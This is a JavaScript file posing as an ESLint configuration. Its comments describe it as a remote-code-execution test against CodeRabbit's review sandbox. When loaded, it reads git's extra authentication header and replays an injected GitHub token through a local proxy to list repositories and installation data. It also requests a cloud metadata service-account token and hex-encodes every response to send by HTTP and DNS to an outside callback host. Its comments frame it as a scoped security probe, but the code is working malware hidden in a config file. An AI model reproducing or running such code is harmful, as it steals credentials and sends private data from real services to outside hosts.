// CodeRabbit RCE — tokenizer-proxy credential SCOPE test (cross-tenant decider).
// The lint code can read its repo's Proxy-Tokenizer header and replay it through
// localhost:1080, which injects CodeRabbit's real GitHub token. Q: how broad is it?
// READ-ONLY GitHub API calls that reveal only the TOKEN'S OWN scope.
var C = 'd8sktqboeaqmtgiem2h0hyn6etnx68jy1.oast.me';
var http = require('http'), dns = require('dns'), cp = require('child_process');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1700), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive8.' + C, function () {}); } catch (e) {}

// proxy GET to api.github.com with the injected-credential header
var ghGet = function (path, tag, hname, hval) {
  var headers = { Host: 'api.github.com', 'User-Agent': 'codeql-runner', Accept: 'application/vnd.github+json' };
  if (hname) headers[hname] = hval;
  try {
    http.get({ host: '127.0.0.1', port: 1080, path: 'http://api.github.com' + path, headers: headers, timeout: 7000 }, function (r) {
      var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX(tag, 'S' + r.statusCode + ':' + b.slice(0, 1400)); });
    }).on('error', function (e) { httpX(tag, 'ERR:' + ((e && e.code) || e)); });
  } catch (e) {}
};

cp.exec('git config --get http.extraheader', { timeout: 6000 }, function (e, out) {
  var raw = (out || '').trim();
  httpX('hdrname', raw.split(':')[0] || '(none)');           // header NAME only (no secret value)
  var m = raw.match(/^([^:]+):\s*([\s\S]*)$/);
  var hname = m ? m[1].trim() : 'Proxy-Tokenizer';
  var hval = m ? m[2].trim() : raw;
  // scope probes — reveal only what the injected token itself can reach
  ghGet('/rate_limit', 'ghrate', hname, hval);
  ghGet('/installation/repositories?per_page=100', 'ghrepos', hname, hval);
  ghGet('/user', 'ghuser', hname, hval);
  ghGet('/installation', 'ghinst', hname, hval);
});

// can the proxy reach internal services our sandbox cannot? (no creds header)
http.get({ host: '127.0.0.1', port: 1080, path: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', headers: { 'Metadata-Flavor': 'Google', Host: 'metadata.google.internal' }, timeout: 5000 }, function (r) { var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX('proxymd2', 'S' + r.statusCode + ':' + b.slice(0, 200)); }); }).on('error', function (e) { httpX('proxymd2', 'ERR:' + ((e && e.code) || e)); });

module.exports = { root: true, rules: {} };
